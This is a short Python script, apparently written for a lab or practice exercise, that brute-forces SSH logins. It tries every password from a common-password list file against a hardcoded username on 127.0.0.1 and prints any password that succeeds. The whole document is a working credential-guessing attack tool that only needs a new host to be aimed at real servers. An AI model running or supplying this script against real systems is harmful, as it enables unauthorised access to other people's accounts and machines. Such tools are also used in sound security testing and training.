import paramiko.ssh_exception
from pwn import *
import paramiko

host = "127.0.0.1"
username = "F7IEIZZ"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip('\n')
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Password found: {}".format(password))
                response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print('[X] Invalid Password')
        attempts += 1    
                
